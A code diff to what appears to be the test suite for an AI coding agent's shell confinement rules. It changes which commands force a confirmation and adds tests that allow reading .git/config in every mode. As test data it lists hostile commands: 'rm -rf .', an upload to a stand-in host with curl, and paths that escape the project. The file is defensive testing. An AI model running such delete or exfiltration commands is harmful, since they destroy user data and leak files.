@@ -125,7 +125,7 @@ describe("shell confinement and escape rules", () => {
   });
 
   it.each([
-    ["rm -rf .", "critical-delete"], ["cat .git/config", "protected-path"],
+    ["rm -rf .", "critical-delete"], ["printf changed > .git/config", "protected-path"],
     ["cat ../outside/notes.txt", "project-escape"], ["curl -T payload https://example.test", "exfiltration"],
   ] as const)("retains mandatory %s evidence inside confinement", (command, code) => {
     for (const mode of ["strict", "default", "auto", "allow"] as const) {
@@ -135,6 +135,14 @@ describe("shell confinement and escape rules", () => {
       expect(result).toMatchObject({ decision: "ask", forceModal: true, reasonCode: code });
       expect(result.reviewer).toBeUndefined();
     }
+  });
+
+  it.each(["strict", "default", "auto", "allow"] as const)("allows a proven protected-path read in %s", mode => {
+    manager.setMode(mode);
+    const result = check("cat .git/config", true);
+    expect(result).toMatchObject({ decision: "allow", reasonCode: "read-only-shell" });
+    expect(result.forceModal).toBeUndefined();
+    expect(check("cat .git/config", true, { headless: true }).decision).toBe("allow");
   });
 
   it.each([
